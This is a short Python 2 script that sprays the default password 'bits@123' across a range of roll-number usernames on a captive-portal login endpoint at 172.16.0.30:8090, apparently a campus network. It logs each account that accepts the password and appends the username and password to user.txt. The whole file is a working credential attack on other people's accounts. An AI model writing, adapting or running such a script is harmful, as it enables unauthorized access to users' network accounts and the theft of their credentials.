import urllib
import time
import datetime
import urllib2
import sys
import xml.dom.minidom as XML

userid=[]
test=[]
trst={}
start=int(raw_input("Enter the starting Roll:"))
end=int(raw_input("Enter the last Roll:"))
for s in range(start,end+1):
    s=str(s)
    userid.append("f"+s)

def sendLoginRequest(username, password):
    url = 'http://172.16.0.30:8090/httpclient.html'
    post_data = 'mode=191' + '&username=' + str(username) + '&password=' + password
    try:
        req = urllib2.Request(url, post_data)
        response = urllib2.urlopen(req)
        xml_dom = XML.parseString(response.read())
        document = xml_dom.documentElement
        response = document.getElementsByTagName('message')[0].childNodes[0].nodeValue
        print response
        if 'successfully' in response:
            return True
        elif 'Limit' in response:
            return True
        elif 'Maximum' in response:
            return True
        elif 'data' in response:
            return True


    except:
        return False

def sendLogoutRequest(username):
    url = 'http://172.16.0.30:8090/httpclient.html'
    post_data = 'mode=193' + '&username=' + username
    req = urllib2.Request(url, post_data)
    response = urllib2.urlopen(req)
    print response
    print 'logout.'

for o in userid:
    # for l in test:
    l="bits@123"
    print l+" "+str(o)
    if sendLoginRequest(o, l) == True:
        #urllib.urlopen("http://google.com")
        print '----------#######---------success!!! and '+l+' - password, userid -'+str(o)
        trst[o]=l
        sendLogoutRequest(str(o))
        with open("user.txt","a") as myfile:
            myfile.write(str(o)+" "+str(l)+'\n')

print trst